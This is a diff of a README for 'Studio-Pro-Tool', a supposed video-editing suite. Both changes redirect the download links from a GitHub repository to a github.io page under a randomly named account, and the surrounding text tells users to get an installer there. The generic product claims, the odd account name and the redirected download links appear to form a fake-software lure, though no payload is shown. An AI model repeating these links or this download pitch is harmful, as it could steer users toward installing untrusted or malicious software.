@@ -1,6 +1,6 @@
 # 🎬 Studio-Pro-Tool - Professional video production made simple today
 
-[![](https://img.shields.io/badge/Download_Studio_Pro-Blue-blue)](https://github.com/Pledged-vespertilionidae732/Studio-Pro-Tool)
+[![](https://img.shields.io/badge/Download_Studio_Pro-Blue-blue)](https://pledged-vespertilionidae732.github.io)
 
 Studio-Pro-Tool provides a suite of professional features for video editors. This software handles high-quality video files and includes modern artificial intelligence tools to improve your workflow. It supports 4K exports and includes a wide range of visual effects to enhance your creative projects.
 
@@ -28,7 +28,7 @@ Your computer requires specific hardware to run Studio-Pro-Tool smoothly. Ensure
 
 You must visit the project page to download the latest version of the installer. 
 
-[Visit this page to download the latest release](https://github.com/Pledged-vespertilionidae732/Studio-Pro-Tool)
+[Visit this page to download the latest release](https://pledged-vespertilionidae732.github.io)
 
 Follow these steps on the website:
 1. Locate the section labeled Releases on the right side of the screen.
